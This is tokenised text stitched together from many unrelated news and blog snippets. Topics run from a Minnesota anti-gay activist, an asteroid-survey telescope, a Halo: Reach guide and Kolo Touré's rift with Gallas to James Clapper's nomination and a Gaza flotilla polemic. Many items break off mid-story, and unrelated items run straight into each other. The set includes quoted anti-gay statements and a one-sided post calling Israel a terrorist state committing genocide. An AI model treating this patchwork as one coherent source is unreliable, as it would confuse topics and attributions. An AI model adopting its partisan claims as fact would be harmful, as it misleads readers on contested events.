Infamously absurd Bachmann , who describes same - sex love as " personal enslavement , " has twice attached her name to You Can Run events .
Meanwhile , Emmer , the Republican 's Tea Party candidate , attended a You Can Run fundraiser last year and will soon visit Dean at his home .
Dean and his little punks also accepted a Republican - donated booth at a recent party convention , and helped Bachmann kick off her campaign earlier this year .
These candidates and the Minnesota GOP should start distancing themselves immediately .
You Can Run 's shepherd Bradlee Dean claims that gay people prey on society at large .
" They molest 117 people before they 're found out .
How many kids have been destroyed , how many adults have been destroyed because of crimes against nature , " said Dean on radio program last May .
He also celebrated diehard Muslims who kill gay people , " Muslims are calling for the executions of homosexuals in America ...
They themselves are upholding the laws that are even in the Bible of the Judeo - Christian God , but they seem to be more moral than even the American Christians do . "
That 's certainly not the type of rhetoric a political candidate wants hovering over his or her campaign .
Well , not on planet earth .
But Emmer and his fellow Minnesota Republicans clearly are operating on the same plane .
Dean 's assertions present two political obstacles , one pressing and the other a bit less consequential .
The surmountable problem comes from the gays : they 're not going to like this , even if they are Republican .
Minnesota 's Log Cabin Republicans described Dean 's comments as " outrageous lies . "
Still , it 's not as if many gay people would be inclined to vote for our age - old nemesis Bachmann and " family focused " Emmer comes across as a Tea Party carbon copy .
The real issue here may come from Republican and independent voters who focus in on Dean 's assertion that " if America wo n't enforce the laws , God will raise up a foreign enemy to do just that .
That is what you are seeing in America . "
To right wing Americans , and especially the Tea Party , who are backing both Bachmann and Emmer , these Muslim - related remarks do n't read as offensive .
They read as endorsements .
And if there 's one thing the far right does n't like , it 's pro-Muslim politicians like that bum Barack Obama .
Why is there something rather than nothing ?
And what does ‘ nothing ’ really mean ?
More than a philosophical musing , understanding nothing may be the key to unlocking deep mysteries of the universe , from dark energy to why particles have mass .

If a planet - destroying asteroid is headed for Earth , scientists now have a much better chance of spotting it .
From its perch atop Hawaii ’s dormant Haleakala volcano , the PS1 telescope , which boasts the world 's largest digital camera , has begun full - time operations , snapping hundreds of high - resolution photos each day as it scans the sky for space rocks and strange stellar phenomena .
PS1 is the first of several telescopes planned as part of the Panoramic Survey Telescope & Rapid Response System , or Pan - STARRS .
The telescope will map near - Earth asteroids ranging in size from 984 feet ( 300 meters ) — big enough to cause major regional destruction if one struck an inhabited area — to 0.6 - mile ( 1 - kilometer ) , which have the potential to produce global catastrophe .
“ It provides the best early - warning system we have , ” said Edo Berger , a professor with the Harvard - Smithsonian Center for Astrophysics who has studied data from the telescope .
The center is part of a consortium that is helping to fund PS1 .
A Digital Eye Bigger Than Hubble's
Although PS1 first came online in late 2008 , it only began complete dusk - to - dawn operations last month .
Now , every 30 seconds PS1 snaps a 1,400 - megapixel shot of a section of sky as large as 36 full moons — a view 3,600 times larger than the Hubble Space Telescope ’s main camera .
One of these images would produce a 300 - dpi print covering half a basketball court .
In total the telescope gathers enough data to fill a thousand DVDs ( nearly five terabytes ) every night and maps a sixth of the sky each month .
It can also see objects ten times fainter than previous surveys .
These abilities are key to discovering not only killer space rocks but huge numbers of much more common phenomena , from planet - size bodies in our solar system to far - flung cosmic cataclysms .
“ For example , we have been able to find more explosive astronomical phenomena ( like supernova explosions ) in one month than the entire astronomical community found in a whole year , ” Berger said by email .
But Berger is most excited about the potential for PS1's far - gazing eye to discover entirely new kinds of space events .
“ I suspect that in the coming months and years we will find new kinds of stellar explosions that will teach us about the final moments in the lives of stars and about the birth of black holes and neutron stars , ” he said .
“ This will take us a long way along the path of charting the heavens , both in space and in time .
I should be beaming with happiness .
I 'm growing up and buying my first home .
On the plus side , I will be able to contribute to the floating versus fixed mortgage debate .
And finally , the lead story of the Sunday Star Times every second week will have some kind of personal relevance .
But I 'm not happy .
This house - buying business is fraught with problems , not the least of which is supervising my mother over the phone while she goes online to look at the photos of my new home on the real estate website .
My mother has got the internet at home but she 's , shall we say , a little bit rusty on it .
Here follows a running ( but approximate ) transcript of my phone conversation with Mummy Eleven .
Me : Hi Mumsikins , I 've bought a house .
Why do n't you go into the magical online world of the internet and have a look at the pictures .
It should be nice and easy with your broadband internet .
Mum : Who ?
What ?
Where ?
Whereforartthou ?
Whoa Nelly .
I mean Rebecca .
I mean Becky .
Oh , now it 's Beck Eleven .
Why can't you use the name I gave you when I pushed you out of my womb all those hardly any years ago .
The internet , you say ?
It sounds dangerous .
There be dragons ?
Me : Yes .
There be dragons .
But only if you Google " dragons " .
Mum : Who is this Googledragons ?
Me : Just go and turn on your computer .
Mum : Ooh .
Turn it on ?
What does it like ?
Sexy knickers and a soft keystroke ?
Me : No , but there are plenty of sexy knickers inside the internet if you press the wrong button .
Let me know when you 've got a window open .
Mum :
But it 's winter .
Do n't you know anything about the concept of insulation ?
( At this point , we disconnect for five minutes and I channel the Dalai Lama , for I know my patience will be sorely tested . )
Me : OK .
Go to the address bar and type in the following .
( I ramble off a lot of letters and numbers and dots and slashes ) .
Mum : No. I can't see anything .
Me : What about now ?
Mum : No .
Me : What about now ?
Mum : I hate the internet .
About this point , as I pretend to get calmer , I become substantially more patronising .
Me : There 's a good girl .
It will be alright .
That 's the way .
Becky 's here .
And here miracles start happening .
Mum can see 10 pictures of the house .
There is a long and ridiculous discussion , while we confirm she is seeing the same thing as I am .
Mum :
Can you see the white house ?
With the hose to the right ?
Is there a bush with one pink flower .
Me : Yes .
Mum :
Is there - ?
Me : I think we can safely assume we are looking at the same thing .
Now I 've got you on the internet .
Do you want to look at another website ?
Let 's open another window .
Mum :
But it 's winter .
I thought we 'd been over insulation .
Me : Not a real window .
An internet window .
Mum :
Not unless it 's double glazed .
Me : I 'm going to boil you .
Mum :
What ?
Me : I did n't say anything .
There 's a good girl .
Becky 's here .
Now let 's open a new internet window by holding down the Control key and pressing the ' N ' key .
Mum :
Do I just click on the red cross ?
Me : No .
If you click on the red cross , everything you 've ever loved will go away .
Mum : I 'm doing it anyway .
Me : Now listen .
You 're going to hear another clicking sound , which will sound much like the phone clicking in your ear .

And for some real shocking news , that is if you ’re shocked by that kind of thing , it seems that LucasArts president Darrell Rodriguez has resigned from his position .
It is uncertain why he resigned , but it seems that Lucas Film ’s Jerry Bowerman will hold LucasArts ‘ reigns until a full - time replacement can be found .
It is said that a number of other top executives are leaving as well , though apparently it should n’t affect any games in development .
According to a statement given to IGN :
“ ” Darrell Rodriguez has resigned and we have initiated a search for a new leader , ” the company said in a statement given to IGN .
“ ” Jerry Bowerman – a member of the Lucasfilm Board of Directors and a games industry veteran – will be stepping in to lead the LucasArts executive team during this transition .
Lucasfilm remains fully committed to making great games and we continue to invest in our business . ” ”
Whatever is going on and whoever will become the new president , it ’s exceedingly unlikely that any of it will have any significant effect on the development of Star Wars : The Old Republic .
Amid all the doom and gloom during the past week about the global loss of biodiversity , there have been a couple of potentially positive steps forward by the usual villain of the piece : China .
For the first time , the government in Beijing has put a hefty value on its forest ecosystems and began drafting new regulations that would oblige rich urban coastal regions to pay compensation fees to unspoiled inland areas that provide carbon sequestration and other environmental services .
These steps suggest China is moving in tandem with United Nation recommendations that environmental costs should be factored into the global economy .
A degree of scepticism is warranted .
China has some of the world 's most enlightened environmental laws and policies , but all too often they are ignored by local officials and businessmen who wo n't let anything get in the way of making a fast yuan .
But a marriage of the environment and the economy might provide a new set of financial incentives for maintaining eco-systems that would otherwise be seen merely as obstacles to development .
Serious money is involved .
The State Forestry Administration estimated last week that forest ecosystems contribute 10 trillion yuan , or about a third of China 's gross domestic product .
This figure - which takes into account carbon sequestration , water conservation , biodiversity protection and biomass production – suggests the administration is seeking not just a new set of values , but a new role for itself now that the nation 's forests are logged out and 2,000 species reportedly threatened with extinction .
More intriguing still are reports that the government is drafting an ecological compensation scheme , which would expand and strengthen existing measures such as payment for wildlife reserves , environmental levies imposed on mines , compensation from upstream river polluters to downstream users and economic redistribution schemes that aim to close the income gap between manufacturing hubs on the east coast and rural hinterland .
Depending on how it is written and enforced , this could be either a boon or a menace to the environment .
Set the value of conservation high and establish an effective mechanism for compensation transfers and this policy could help to correct the market 's failure to protect the commons and recognise the long - term value of biodiversity .
On the other hand , if the price of nature is set too low and regulation is too weak - both currently the case – then this policy could accelerate the unsustainable extraction of resources .
The ministry of environmental protection – arguably the most idealistic but weakest branch of the government - has a tough task ahead in calculating regional ecological accounts .
But , at the very least , such an eco-accounting ought to stimulate a new way of thinking about environmental values .
Image caption Chris Brown was also sentenced to five years ' probation
US singer Chris Brown has been forced to postpone his UK tour after being denied a visa to enter the country , it has been confirmed .
Brown was refused permission on the grounds of being guilty of a serious criminal offence , the Home Office said .
He was sentenced to a community service order for assaulting his ex-girlfriend , singer Rihanna , last February .
The musician was due to play three UK concerts , starting in Glasgow on Wednesday night .
Two further dates in London , Birmingham and Manchester had also been planned , along with a concert in Cork in the Irish Republic which has been shelved too .
Tour promoters SJM confirmed the concerts have been postponed " due to unforeseen circumstances " .
They advised concert - goers to hold onto their tickets as there would be " possible re-arranged dates " .
Sony Music also confirmed that the singer 's tour has been postponed " due to issues surrounding his work visa " .
" Chris looks forward to performing for his fans abroad in the near future and thanks them for their continued support , " it added .
Brown had posted on his Twitter feed that he had been denied entry to the UK , but the entries were subsequently removed .
In a statement , the Home Office said : " We reserve the right to refuse entry to the UK to anyone guilty of a serious criminal offence .
Public safety is one of our primary concerns .
" Each application to enter the UK is considered on its individual merits , " it added .

This one , the first , will serve as an introduction and provide information on the game ’s campaign and weapons .
The first thing that you need to know is that the Halo : Reach Multiplayer Beta starts on May 3rd , 2010 .
To get in on the Beta you ’ll need a copy of Halo 3 : ODST .
Once the Beta goes live you ’ll access it through an option in the ODST menu , similar to how the Halo 3 Beta was accessed via Crackdown .
A high - speed internet connection and an Xbox LIVE Gold Account are required .
You ’ll also need 1.2 Gigabytes of free space on your 360 hard drive .
Okay , now that that ’s out of the way , we can move on to the really juicy stuff .
The Halo : Reach Compendium is organized neatly for your convenience into eight sections : Campaign , Weapons , Armor Abilities , Player Investment System , Matchmaking System , Gametypes , Maps , Uncategorized , and Conclusions .
The Uncategorized section consists of things that do n’t fit with the other topics and do n’t merit their own sections .
In Conclusions I ’ll take all the information we know so far and present my own theories in an attempt to fill in the blanks .
Campaign
Halo : Reach will be a prequel to the original Halo trilogy .
It follows a group of Spartans who are on the planet Reach when it is attacked by the Covenant .
Reach is the most important human world other than Earth , and is the planet that the Pillar of Autumn is fleeing from in the beginning of Halo : CE .
It houses the UNSC ’s largest shipyard and is where the Master Chief and the other Spartan IIs were trained .
You ’ll be playing as a Spartan III this time around , though .
The Spartan IIIs were the UNSC ’s attempt at making super soldiers much more cheaply and efficiently .
It worked .
Many more of them were created in a shorter time than the Spartan IIs .
But , because of this , they were more expendable .
The Spartan IIIs were used as living fire - and - forget weapons and often sent on suicide missions .
- Noble Team -
The particular Spartan III that you ’ll be playing in Halo : Reach is ambiguously called Noble Six .
He ( or she ) is the sixth member of Noble Team , recently transferred there to replace another fallen Spartan .
Noble Six is purposefully made a blank slate so players can put themselves into the role of the Spartan .
You ’ll even be able to customize his / her armor , but we ’ll address that more in the Player Investment System section of the Compendium .
Apparently though , Noble Six does have a reputation as a lone wolf , as mentioned in this Halo : Reach trailer .

No more information about Noble Team has been revealed yet .
It is unknown why they are on Reach when the Covenant attack , or what their mission is after the invasion begins .
- Campaign Vehicles -
Noble Team ’s aerial transport vehicle is the Falcon .
There is no word whether it will be flyable by the player at any point in the game , but I doubt it .
It ’s most likely just Halo : Reach ’s answer to the Pelican .
You wo n’t just be confined to UNSC sanctioned transportation , however .
You ’ll be able to commandeer civilian vehicles to splatter Grunts with .
- Enemies -
Regarding the enemies you ’ll be facing in the campaign , the Elites are back as the main bad guys , which makes perfect sense with where this game sits in the Halo timeline .
A new enemy race has also been revealed , the Skirmisher .
These scary little guys are “ cousins ” to the Jackal , and specialize in flanking their enemies using pack tactics .
Bungie has been vocal about their plan to give Halo : Reach a darker and more foreboding atmosphere than other Halo games have had .
“ From the beginning , you know the end ” is a line straight from the first teaser trailer for the game .
Reach is destined to fall , and its surface will be melted to glass .
They want the Covenant to be frightening again , and one way they are doing that is by making their speech incomprehensible to humans .
Everything wo n’t be instantly translated for you anymore .
That ’s about all the facts we have on the Halo : Reach campaign so far .
Not enough for you ?
I know , me neither .
Here are a few screenshots to alleviate your pain .
After those amazing images , you ’ll find the Weapons section of the Compendium .
Weapons
The weapons are arguably the most important part of a Halo FPS game .
Halo :
Reach brings several changes to how old weapons work and introduces a slew of completely new armaments .
- General Changes -
Dual - wielding is gone .
You will only be able to use one weapon at a time .
The reticules of some weapons now expand as they are fired to show how the accuracy decreases .
Spraying weapons and tracking weapons now have a secondary ghost reticule which indicates where you need to aim to hit a moving target .
A number of small things have changed about the grenades .
There are only two grenade types in Reach : the Frag and Plasma .
Bungie has decided to get rid of the Flame and Spike grenades in an attempt to simplify things .
The Plasma and Frag grenades have been strengthened and made more visible .
If a grenade goes off close enough to hurt , but not close enough to kill , it will temporarily leave your ears ringing .
Also , thrown grenades do a small bit of damage if they smack directly into an enemy .
- Returning Weapons -
Magnum
The M6G human pistol in Reach is very much like the pistol from Halo : CE .
It has a 2 x zoom and kills a fully shielded enemy in five headshots .
It can be fired very quickly but the accuracy decreases dramatically if it is .
Rocket Launcher
The vehicle lock - on returns from Halo 2 , but the rocket ’s do n’t appear to track as strongly .
Needler
Is more powerful now since it can not be dual - wielded .
Assault Rifle
Looks quite different and seems to be a bit more powerful with a longer range .
Below is a list of all the other returning weapons which have no real discernible difference when compared to Halo 3 .
Energy Sword
Gravity Hammer
Shotgun
Plasma Pistol
Sniper Rifle
- New Weapons -
The Designated Marksman Rifle is like the Battle Rifle from previous Halo games but instead of firing bursts of three rounds , it ’s a single shot weapon .
It is effective at both medium and long ranges thanks to the scope it features .
Five headshots from this baby will kill an enemy .
Sound familiar ?
It fires the same round as the Magnum but takes slightly longer to fire and is more accurate .
Bungie employees themselves have dubbed this sexy thing the Pro Tube .
As you would guess from its official name , it launches grenades .
Frag grenades .
If you pull the trigger normally , said launched grenade will bounce off of floors , walls , and other objects until either its fuse runs out or it hits an enemy , in which case it then explodes .
There is another way to fire this weapon , though .
When you hold down the trigger the grenade will not explode until you let go .
Then when it does , it releases a small EMP blast which can immobilize any vehicle or damage the shields of any enemy nearby .
This delayed detonation feature makes the Grenade Launcher useful for setting traps for enemies or air bursting flying vehicles ( or jetpacking noobs ) .
The Covenant ’s accurate rifle weapon .
It fires sharp pink shards , like the Needler , but they seem to have much weaker tracking .
It only takes a few shots after an enemy ’s shield has been depleted for the needles embedded in them to super - combine and explode in a pink cloud of death .
A rapid fire energy weapon similar to the classic Covenant Plasma Rifle .
It differs from the Plasma Rifle in that it is a bit more powerful and fires more slowly as it overheats .
It must be allowed to cool down before its rate of fire returns to normal .
For balancing reasons , the Plasma Repeater will only be available to use in the multiplayer .
The enemy Elites in the campaign will be armed with the Plasma Rifle that Halo fans are used to seeing in their hands .
The Focus Rifle is a combination of two older Halo weapons ; the Sentinel Beam and the Beam Rifle .
It is a sniper weapon that fires a continuous stream of directed energy toward its target .
It overloads quickly but can be very dangerous in the right hands .
A grenade launcher of alien design .
The Plasma Launcher locks on to both vehicles and enemies on foot .
It can launch up to four Plasma grenades which track the target .
The longer the trigger is held down , the more grenades can be fired at one time .
It has a good range but takes a long time to charge up .
That ’s it for the Halo : Reach Compendium Part 1 .
Part 2 will be coming soon and will cover the sections on Armor Abilities , the Player Investment System , and the Matchmaking System .

PARIS  The French Parliament gave final and unanimous approval on Tuesday to a law that makes “ psychological violence ” a criminal offense as part of a law intended to help victims of physical violence and abuse , especially in the home .
The law is thought to be too vague by some judges and the police , and whether they choose to investigate and prosecute such offenses will define the success of the new legislation .
Nadine Morano , the secretary of state for the family , told the National Assembly that “ we have introduced an important measure here , which recognizes psychological violence , because it is n’t just blows , but also words . ”
Ms. Morano said the primary abuse help line for French women got 90,000 calls a year , with 84 percent concerning psychological violence .
The Cinderella story of 12 - year - old Greyson Chance – going from a sixth - grader in Edmond , Okla . , to an Internet sensation with a Hollywood manager in a few short weeks – is a textbook case in the power of the Internet to create flash stars .
Yet the nearly flawless march from choirboy to Hollywood ’s next " It Boy " is also a good window into the perplexing problem of the modern digital world : namely media manipulation , say media and marketing experts .
All confirmable accounts seem to indicate the family story is the amateur - dream - come - true that it appears to be .
But the narrative also has all the telltale markers of a professionally managed event , experts say .
The audio recording on Greyson ’s video was unusually good for a school talent show , “ and the speed with which he went from unknown to a guy on ‘ Ellen ’ talking to Lady Gaga was rather amazing , ” writes Michal Ann Strahilevitz , associate professor of marketing at Golden Gate University in an e-mail .
Indeed , London - based media expert Alan Stevens ticks off all the ways the tale fits a carefully managed “ populist ” rise to stardom :
Professional video techniques such as cutaways and edit .
A lack of complaints about copyright infringement from big names whose work is being copied .
Associated Facebook pages and Twitter feeds that appear suddenly .
Swift access to top news and other media outlets and immediate availability of talent to travel and be interviewed .
One day , young Greyson is in math class ; the next on a Hollywood soundstage and being linked to Madonna 's manager .
Fake viral campaigns have become a ploy of the modern age , says writer and television producer Christopher Moloney .
“ We 're at the point where there 's more ' fake ' stuff than real stuff out there .
It 's a shame because those of us who are working in TV – and getting this stuff sent to us every second of the day – can spot the ' fake ' stuff pretty quickly , ” he writes in an e-mail .
For example , he says , if a camera shows a guy chopping down a tree , then it “ pans over to the guy 's truck , and then back to the tree , you know he planned to drop a tree on his vehicle all along . ”
While the provenance of the latest child - star may not shake the halls of Congress , anything that erodes an atmosphere of confidence hurts the entire community , says Len Shyles , an associate professor of communication at Villanova University , in an e-mail .
“ It is dishonest because it leads people to believe it is something it is not , ” says Professor Shyles .
“ It is designed to manipulate public opinion . "
While questions about truth - in - advertising date at least to the Roman days of caveat emptor , challenges in sniffing out the real from the faux are exacerbated in the digital age of anonymous communication , points out Tom Eppes , who heads the board of ethics for the Public Relations Society of America ( PRSA ) .
“ The underpinnings of the Internet and – really – democracy , are trust and honesty , ” he says .

Hamas forces seized $ 16,000 on Sunday from a Gaza bank that had frozen the funds as part of an anti-money laundering campaign launched by the West Bank - based Palestinian Authority .

A few hours after the town hall meeting began , deep into the question - and - answer portion , Bill Finnegan lined up for a turn at the microphone .
He had not come with any intention to speak , but as the evening dragged on , he changed his mind .
A Muslim group had made a deal to buy an empty convent from the Catholic parish of St. Margaret Mary in the Midland Beach section of Staten Island and open a mosque .
A civic association organized a meeting with representatives of the group , the Muslim American Society , on the evening of June 9 .
Mr. Finnegan had gone , he said later , to “ see what all the hoopla was about . ”
There were many statements from the audience dressed up as questions to the Muslim representatives :
Were any parts of the Koran incorrect ?
Would they denounce Hamas and Hezbollah , and was n’t it true that they were connected to those groups ?
Did n’t all terrorists come out of mosques ?
Mr. Finnegan , 25 , began by introducing himself .
“ I said , ‘ My name is Bill Finnegan , and I ’m a United States Marine recently returned from Afghanistan , ’ ” he said .

• ' We did n't talk to each other at all ' •
' One of us had to go and it was me '
Kolo
Touré has spoken publicly for the first time about the breakdown in his relationship with William Gallas and admitted that it was the tension of not being on speaking terms with one of his team - mates , refusing even to talk during matches , that made him decide to leave Arsenal .
The bad feeling between the two former central defensive partners became so deep‑rooted , according to Touré , they would not even discuss match instructions .
Touré eventually became so disillusioned he handed in a transfer request and , even though it was rejected initially , he had made up his mind that the situation was both intolerable and irreparable , eventually moving to Manchester City last summer for £ 16 m .
" When you play with somebody and you do n't even talk to each other on the pitch it 's really difficult , " he said .
" Me and Gallas ... we did n't talk to each other at all .
One of us had to go and it was me .
It was coming down to me really because I did n't want to put the team in a difficult position , so I was the one who said I wanted to go .
" As a player , I had great respect for Gallas because he was older than me and in Africa when someone is older you have respect for them , but I think sometimes he took advantage of that in some ways .
I had six years at Arsenal but the last two were very difficult .
It can happen in football that you argue with somebody in training but when you are not even talking on the pitch something has to change . "
Touré will be back at Arsenal tomorrow , leading out City in a match laced with subplots , most notably Emmanuel Adebayor 's first return to the club since that rancorous encounter at Eastlands last September , when he raked his studs down Robin van Persie 's face and celebrated scoring by running almost the entire length of the pitch to goad the Arsenal fans .
Adebayor is guaranteed a hostile reception whereas Touré and Patrick Vieira can expect a much more positive reaction from the Arsenal fans but , for City 's captain , there will be mixed feelings when he reflects on the way his feud with Gallas forced his departure .
On one occasion , in December 2008 , Gallas is said to have torn into his younger team - mate after a scoreless draw at Aston Villa , with Touré apparently disappointed that Arsène Wenger did not defend him .
Touré lost his place and his suspicion is that there was " a player who got the manager believing that he and I had no understanding on the field " .
Wenger did attempt to heal the rift but eventually accepted it was beyond repair and ultimately decided he could dispense with Touré .
" I think he understood he had to sell one of us , " the player said .
" I did n't want to make any trouble to Arsenal because I had a really good time there and they gave me my chance .
I was nobody when I went there and there is no problem with Arsène ; not at all , I have huge respect for him .
" But I was not feeling happy in the team and , for me , I was looking for somewhere else and a new challenge .
I think it was the right thing for me and for Arsenal , and I am at a club now where I am happy . "
Touré , 29 , was reluctant to reveal what was at the centre of his arguments with Gallas , three years his senior , explaining that " it is difficult and if we start talking about that then it will be a big story . "
However , he said it had nothing to do with Gallas 's infamous sit - down protest after Arsenal had conceded a last - minute equaliser against Birmingham City at St Andrew 's in February 2008 .
" That kind of thing can happen but , after he did that , he never did anything like that again .
It was just a reaction after a game .
I know that he would never do that again .
But it was more a misunderstanding between him and me .
We misunderstood each other and one had to leave . "
If you only read one manifesto this week , you owe it to yourself to read Maureen Johnson 's amazing rantifesto about people who try to turn themselves into Brands on the Internet .
It 's the funniest , most cheer - worthy thing I 've read lately .

Johnson 's explanation of why authors should n't try to turn themselves into brands is amazing .
( " A brand says I will churn out the same thing over and over .
Which I wo n't , because I am weird . " )
But also , she has something important to say about the Internet :
The more the internet expands , the more people - okay , authors , who are a KIND of people - are being encouraged * to go online and PROMOTE , PROMOTE , PROMOTE !
To aid in this endeavor , these poor writers are being shipped off to conferences where they roll out people like me under the guise of being experts on something .
And in general , the quality of advice is pretty craptastic .
" Get a Facebook page ! " " Get lots of people to LIKE you ! "
" SHOUT THE TITLE OF YOUR BOOK AT PEOPLE UNTIL THEY START CRYING AND BUY IT . "
Or , more annoyingly , we experts use the genuine language of community ( " Make authentic friends ! " " Network ! " ) to do the same thing , just with a softer sell .
But it 's still all about selling .

And then she gets to the part where she explains how to keep this kind of thinking from turning the entire Internet into a sterile , soulless dystopia :
The internet is made of people .
People matter .
This includes you .
Stop trying to sell everything about yourself to everyone .
Do n't just hammer away and repeat and talk at people - talk TO people .
It 's organic .
Make stuff for the internet that matters to you , even if it seems stupid .
Do it because it 's good and feels important .
Put up more cat pictures .
Make more songs .
Show your doodles .
Give things away and take things that are free .

Well , maybe he did at one point , so expect this to become a big deal in James Clapper ’s confirmation hearings to replace Dennis Blair as the Director of National Intelligence .
Washington Times reporter Eli Lake did a little research on Barack Obama ’s choice for the thankless position ( Clapper would be the fourth DNI in five years ) and discovered a nugget that comes straight out of the so - called neocon argument for war against Saddam Hussein :
President Obama ’s choice to be the next director of national intelligence supported the view that Saddam Hussein ’s regime in Iraq sent weapons and documents to Syria in the weeks before the 2003 U.S. invasion .
A senior U.S. intelligence official said retired Air Force Lt. Gen. James R. Clapper , a former director of the Defense Intelligence Agency and current undersecretary of defense for intelligence , will be the next DNI .
A formal announcemente is expected as early as Saturday .
… Gen. Clapper headed the National Geo-spatial Intelligence Agency between September 2001 to June 2006 .
The NGA is responsible for creating maps and terrestrial imagery and also assesses what is called “ measurement and signature intelligence , ” or MASINT , the intelligence function of analyzing such things as radar signals and the composition of air particles , soil samples and other physical characteristics of the earth .
On Iraq , Gen . Clapper said in an interview with The Washington Times in 2004 that “ I think probably in the few months running up prior to the onset of combat that … there was probably an intensive effort to disperse into private homes , move documentation and materials out of the country .
I think there are any number of things that they would have done . ”
The comments came amid the debate over Iraq ’s weapons of mass destruction programs , which some U.S. officials had said were moved out of Iraq prior to the invasion of Iraq with the assistance of Russian military intelligence forces .
From this description , it seems as though Clapper parsed his words carefully .
He never mentions WMD , at least not in the portion quoted by Lake .
However , there was no real reason to cart anything else out of Iraq just prior to the invasion .
Saddam Hussein certainly had plenty of conventional weapons , and no one had suggested that Saddam needed to disarm himself of those .
In fact , it would make no sense at all for Saddam to have moved conventional weapons out of Iraq just as the US poised to invade .
Clapper has some other problems as well .
Leadership in Congressional intel committees wanted a civilian in the post , and someone more closely tied to Obama himself .
The obvious choice would have been Leon Panetta , the CIA Director , but Panetta just won a big turf war with the departing Blair , which would have made that move a demotion in practical terms .
Likewise , Clapper has spent the last couple of years arguing that the Pentagon should have final authority over its intel budgets , not the DNI , which makes the position even weaker .
If anything , Clapper ’s nomination to the post highlights both the lack of competence at the White House and the structural problems created by the reorganization of the intel communities five years ago .
Why would Obama choose someone who has spent the last couple of years attempting to make the position weaker ?
And why are we still looking to find the next unlucky candidate to get all the blame and little authority , rather than undoing the 9/11 Commission “ reform ” and fixing the very obvious problems in organization , lines of authority , and turf battles in the American intelligence community ?
Blair ’s resignation gives us an opportunity to fix those problems , but Obama seems intent on making them even worse .
Posted by John , June 2nd , 2010 - under Israel , Palestine .
The terrorist state of Israel assassinated 19 unarmed activists in the Gaza freedom flotilla .
People around the world are rightly angry .
We need to build on that anger as part of the global campaign to win real gains for the Palestinian people .
This massacre is standard fare for the Israelis .
This is the type of treatment the people of Palestine endure on a regular basis .
In 2005 Israel withdrew its troops and settlements from Gaza .
While they Israelis have always restricted entry into and exit from Gaza , they began their blockade in earnest when Hamas , the democratically elected Government of Palestine , took over Gaza .
They claim they allow in ‘ humanitarian ’ aid but that is not true .
Here ’s what Wikipedia says about the blockade :
The Gaza Strip has land borders with Israel and Egypt , and a sea border .
Egypt and Israel largely keep their borders with the territory sealed .
Israel allows only limited humanitarian supplies from aid organizations into the Strip .
The amount of goods Israel allows into Gaza is one quarter of the pre-blockade flow .
The Israeli navy maintains a sea blockade from three nautical miles offshore .
Egypt has constructed an underground steel barrier to prevent circumvention of the blockade through smuggling tunnels .
Richard Falk , UN special rapporteur for human rights in the Palestinian territories , has called the blockade a crime against humanity .
What are the impacts of this illegal Israeli action ?
According to Filippo Grandi , the Commissioner General of the UN Relief and Works Agency for Palestine Refugees in the Near East , that the problems faced by Gaza are not just humanitarian , but “ encompass every aspect of society . ”
The Israeli invasion occurred 17 months ago .
The Israelis killed 1400 Palestinians and destroyed schools , hospitals , homes and mosques .
John Holmes , Under - Secretary - General for Humanitarian Affairs , says it is “ disturbing ” that “ no meaningful reconstruction has yet started . ”
The Israelis do n’t want reconstruction to occur .
According to the BBC ‘ Amnesty International has dubbed the blockade “ collective punishment ” resulting in a “ humanitarian crisis ” ; UN officials have described the situation as “ grim ” , “ deteriorating ” and a “ medieval siege ” . ‘
Here ’s the BBC again on what the Israeli blockade normally does n’t allow in .
The UN relief agency for Palestinian refugees Unrwa ’s list of household items that have been refused entry at various times includes light bulbs , candles , matches , books , musical instruments , crayons , clothing , shoes , mattresses , sheets , blankets , pasta , tea , coffee , chocolate , nuts , shampoo and conditioner .
Many other items – ranging from cars to fridges to computers – are generally refused entry .
Building materials such as cement , concrete and wood were nearly always refused entry until early 2010 , when some glass , wood , cement and aluminium were allowed in .
Unemployment is 40 percent .
Many Gazans go hungry .
Here ’s what the BBC says :
… the UN ’s Food and Agriculture Organisation says 61 % of Gazans are “ food insecure ” .
According to the UN agency for Palestinian refugees , Unrwa , 80 % of Gazan households rely on some kind of food aid .
Unrwa provides food aid for 750,000 people , half the population .
60 percent of Gazan children have anaemia .
Power is intermittent .
The water system is crap – literally .
An Amnesty International report mentioned in Haaretz , an Israeli newspaper , ‘ said Gaza ’s coastal aquifer , its sole fresh water resource , had been polluted by infiltration of seawater and raw sewage and degraded by over - extraction . ’
The same report argued that Israelis receive four times as much water as Palestinians .
The blockade is collective punishment for Palestinians democratically electing Hamas as their Government .
They elected Hamas because Fatah was corrupt and because 17 years of the peace process between Fatah and the Israelis has seen the position of the Palestinians go backwards .
Rather than stopping the ongoing dispossession – ethnic cleansing under another name – the ‘ peace ’ process has accelerated the genocide .
The Israelis have built an apartheid wall which turns what ’s left of the West Bank of Palestine into small disconnected and divided plots of land .
It continues evicting Palestinians and settling Jewish people in previously Palestinian areas .
Here is a map clearly showing the loss of land the Palestinians have suffered .
That trend continues .
Strange people these Palestinians – they fight back against genocide .
What is the way forward for Palestine ?
Richard Falk , UN special rapporteur for human rights in the Palestinian territories , summed it up :
I ’ve said for some time that the best hope for the Palestinians is not at a governmental level or through reliance on the United Nations , but rather through the boycott , divestment and sanctions campaign , which has increasingly come to resemble the anti-apartheid campaign that was so successful in delegitimizing the racist regime in South Africa .
Of course it was the struggle of South Africans themselves for freedom , in particular the strength of the trade union movement in South Africa , together with international support and solidarity from ordinary working people round the world , that won the long bloody battle against apartheid .
It is the struggles of the Palestinian people , the Arab masses and our support – economic and political – that hold within them the seeds of the defeat of apartheid Israel .
For those of us in the West that means demonstrating against the Israeli terrorists and building the movement for boycotts , divestment and sanctions against Israel .
Bangladesh : school children learn and talk about human trafficking
7 June 2010 - Six days a week , 10 - year - old Anima treks the one kilometre to the only primary school in her village , in the border area of Bangladesh .
She walks barefoot with a torn satchel slung over her shoulders .
Her father breaks stones in a nearby quarry while her mother works in the paddies .
These days , her 5 - year - old sister accompanies her as well .
Braving the scorching heat , stone - filled roads and dust , they reach their school .
The classroom is tiny and there are only two windows , an old table , a chair and a makeshift blackboard .
Around 100 eager children aged between 5 and 12 attend class in this one room .
Attending school may be an ordinary scene in urban cities , but in this remote village , it is a remarkable feat .
The children sit on the floor , books open on laps , and listen to the senior headmaster , who is from Kolkata , India .
He dedicates all his time to helping the children to stay in school and complete their education and , most importantly , to talk to them about human trafficking , why it occurs , its cause , who are the potential victims and how to take preventive steps .
The headmaster explains that " there have been several reported cases in this village , where girls as young as 5 years old have been trafficked or sold by families .
They become victims of sexual and labour exploitation in West Bengal .
Approximately 7,000 girls and women are trafficked from Bangladesh to West Bengal annually .
